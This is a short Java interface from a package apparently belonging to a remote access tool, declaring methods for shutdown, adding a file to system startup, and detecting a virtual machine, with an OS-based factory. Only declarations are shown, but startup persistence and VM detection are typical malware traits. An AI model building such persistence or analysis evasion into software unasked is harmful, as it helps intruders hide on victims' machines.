package de.sogomn.rat.service;

import java.io.File;

public interface IOperatingSystemService {
	
	void shutDown();
	
	void addToStartup(final File file);
	
	void removeFromStartup(final File file);
	
	boolean isVm();
	
	public static IOperatingSystemService getInstance() {
		final String os = System.getProperty("os.name").toUpperCase();
		
		if (os.contains("WINDOWS")) {
			return new WindowsService();
		} else if (os.contains("MAC")) {
			return new MacService();
		} else if (os.contains("NIX") || os.contains("NUX") || os.contains("AIX")) {
			return new LinuxService();
		}
		
		return null;
	}
	
}
